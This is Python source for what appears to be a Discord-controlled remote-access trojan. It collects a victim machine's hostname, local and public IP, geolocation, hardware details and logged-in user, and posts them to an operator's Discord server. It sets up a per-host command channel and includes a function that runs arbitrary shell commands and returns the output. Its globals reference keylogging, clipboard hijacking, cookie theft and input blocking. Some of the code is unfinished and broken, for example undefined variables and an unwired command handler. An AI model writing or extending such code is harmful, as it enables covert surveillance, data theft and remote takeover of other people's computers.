import configparser
import socket
import platform
import psutil
import requests
import discord
from discord.ext import commands
import threading
import subprocess
import wmi
import asyncio


config_file_path = 'config.ini'
config = configparser.ConfigParser()
config.read(config_file_path)
BOT_TOKEN = config['Settings']['token']
GUILD_ID = config['Settings']['server_id']
GUILD_ID = int(GUILD_ID)
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
c = wmi.WMI()
client = discord.Client(intents=discord.Intents.all())

def get_system_info():
    hostname = socket.gethostname()
    try:
        local_ip_address = socket.gethostbyname(hostname)
    except socket.gaierror:
        local_ip_address = "Unable to get local IP Address"
    try:
        response = requests.get("https://ipinfo.io/json")
        if response.status_code == 200:
            ip_info = response.json()
            public_ip = ip_info.get("ip", "N/A")
            city = ip_info.get("city", "N/A")
            region = ip_info.get("region", "N/A")
            country = ip_info.get("country", "N/A")
            org = ip_info.get("org", "N/A")
        else:
            public_ip, city, region, country, org = ["N/A"] * 5
    except requests.RequestException:
        public_ip, city, region, country, org = ["N/A"] * 5
    system = platform.system()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    registered_user = c.Win32_ComputerSystem()[0].UserName
    cpu_count = psutil.cpu_count(logical=True)
    cpu_physical_cores = psutil.cpu_count(logical=False)
    cpu_freq = psutil.cpu_freq().current if psutil.cpu_freq() else "Unknown"
    virtual_mem = psutil.virtual_memory()
    total_memory = virtual_mem.total / (1024 ** 3)  # Convert to GB
    disk_info = psutil.disk_usage('/')
    total_disk = disk_info.total / (1024 ** 3)  # Convert to GB
    info = (
        f"**Local Hostname:** {hostname}\n"
        f"**Local IP Address:** {local_ip_address}\n"
        f"**Public IP Address:** {public_ip}\n"
        f"**Location:** {city}, {region}, {country}\n"
        f"**Organization:** {org}\n"
        f"**Operating System:** {system} {release}\n"
        f"**OS Version:** {version}\n"
        f"**Machine:** {machine}\n"
        f"**Processor:** {processor}\n"
        f"**CPU Count:** {cpu_count} (Physical: {cpu_physical_cores})\n"
        f"**CPU Frequency:** {cpu_freq} MHz\n"
        f"**Total Memory:** {total_memory:.2f} GB\n"
        f"**Total Disk Space:** {total_disk:.2f} GB\n"
        f"**Registered User:** {registered_user}"
    )
    return hostname, info
def execute_command(command, channel):
    try:
        # Execute the command and capture the output
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if output == "":
            output = "No output or command not found."
    except Exception as e:
        output = f"Error executing command: {str(e)}"

    # Send the output back to the Discord channel
    client.loop.create_task(channel.send(f"```{output}```"))
@client.event
async def on_ready():
    print(f"{client.user} has connected to Discord!")
    guild = discord.utils.get(client.guilds, id=GUILD_ID)

    if not guild:
        print(f"Could not find guild with ID {GUILD_ID}. Make sure the bot is added to the server.")
        return

    print("Getting system info")
    # Get system info
    hostname, system_info = get_system_info()

    # Check if category exists, else create it
    category = discord.utils.get(guild.categories, name=hostname)
    print("Creating category.")
    if not category:
        category = await guild.create_category(name=hostname)
        print(f"Created new category: {hostname}")

    # Create a channel under the new category for system info
    info_channel_name = f"{hostname}-info"
    info_channel = discord.utils.get(category.channels, name=info_channel_name)
    if not info_channel:
        info_channel = await category.create_text_channel(name=info_channel_name)
        print(f"Created new channel: {info_channel_name}")

    # Send system information to the channel
    await info_channel.send(system_info)

    # Create a channel under the new category for commands
    commands_channel_name = f"{hostname}-commands"
    commands_channel = discord.utils.get(category.channels, name=commands_channel_name)
    if not commands_channel:
        commands_channel = await category.create_text_channel(name=commands_channel_name)
        print(f"Created new channel: {commands_channel_name}")
    else:
        print(f"Command channel already exists: {commands_channel_name}")
@client.event
async def on_message(message):
    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop, input_blocked, custom_message_to_send, turned_off
    # .log New message logged
    if message.author != client.user:
        if message.content == f'<@{client.user.id}>':
            await client.get_channel(channel_ids['main']).send(f'<@{message.author.id}>')
        if message.channel.id in channel_ids.values():
            if message.content == '.exet':
                await message.delete()
                print(message)
                print(message.content)


client.run(BOT_TOKEN)